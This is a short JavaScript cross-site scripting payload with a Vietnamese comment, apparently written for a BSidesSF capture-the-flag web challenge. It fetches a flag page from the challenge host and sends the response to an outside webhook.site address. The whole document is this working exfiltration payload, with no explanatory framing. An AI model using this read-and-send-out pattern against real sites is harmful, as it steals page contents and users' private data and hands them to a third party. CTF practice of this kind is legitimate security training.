fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag')
  .then(response => response.text())
  .then(data => {
    // Gửi cờ về lại đúng cái webhook bạn đang mở
    fetch('https://webhook.site/21b58a71-7dbb-4ce6-ab36-504c00abe295/?flag=' + encodeURIComponent(data));
  });